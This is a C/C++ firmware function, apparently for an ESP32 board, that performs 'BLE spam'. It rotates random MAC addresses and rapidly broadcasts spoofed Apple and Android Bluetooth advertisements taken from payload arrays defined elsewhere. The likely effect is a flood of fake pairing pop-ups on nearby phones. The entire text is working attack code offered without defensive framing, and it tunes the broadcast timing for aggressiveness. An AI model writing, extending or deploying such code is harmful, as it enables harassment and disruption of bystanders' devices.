void sendBleSpam() {
    uint8_t raw_adv_data[31];
    const uint8_t flags[] = {0x02, 0x01, 0x06}; // Standard BLE Flags

    // Burst Mode: Send 3-5 different identities per duty cycle
    for (int i = 0; i < 3; i++) {
        uint8_t current_mac[6];
        const uint8_t *device_data = nullptr;
        uint8_t device_len = 0;

        for (int i = 0; i < 6; i++) {
            current_mac[i] = esp_random() % 256;
            if (i == 0) current_mac[i] |= 0xC0; // Random Static Address format
        }
        esp_ble_gap_set_rand_addr(current_mac);

        int r = esp_random() % 3;
        if (r == 0) {
            device_data = DEVICES[esp_random() % 17];
            device_len = 31;
        } else if (r == 1) {
            device_data = APPLE_SHORT_DEVICES[esp_random() % 13];
            device_len = 23;
        } else {
            device_data = ANDROID_DEVICES[esp_random() % 3];
            device_len = 23;
        }

        int total_len = 0;
        if (device_len <= 28) { // Fit flags and payload
            memcpy(raw_adv_data, flags, 3);
            memcpy(raw_adv_data + 3, device_data, device_len);
            total_len = 3 + device_len;
        } else { // Payload is too big (31 bytes), send without flags to fit
            memcpy(raw_adv_data, device_data, 31);
            total_len = 31;
        }
        esp_ble_gap_config_adv_data_raw(raw_adv_data, total_len);

        esp_ble_adv_params_t adv_params = {
            .adv_int_min = 0x0020,
            .adv_int_max = 0x0040,
            .adv_type = ADV_TYPE_NONCONN_IND,
            .own_addr_type = BLE_ADDR_TYPE_RANDOM,
            .channel_map = ADV_CHNL_ALL,
            .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
        };

        esp_ble_gap_start_advertising(&adv_params);
        vTaskDelay(pdMS_TO_TICKS(80)); // Allow BLE stack time to broadcast packets, slightly aggressive
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(20)); // Minimal delay for stack stability

        AtomicUtils::safe_store(blePacketCount, AtomicUtils::safe_load(blePacketCount) + 1);
    }
}

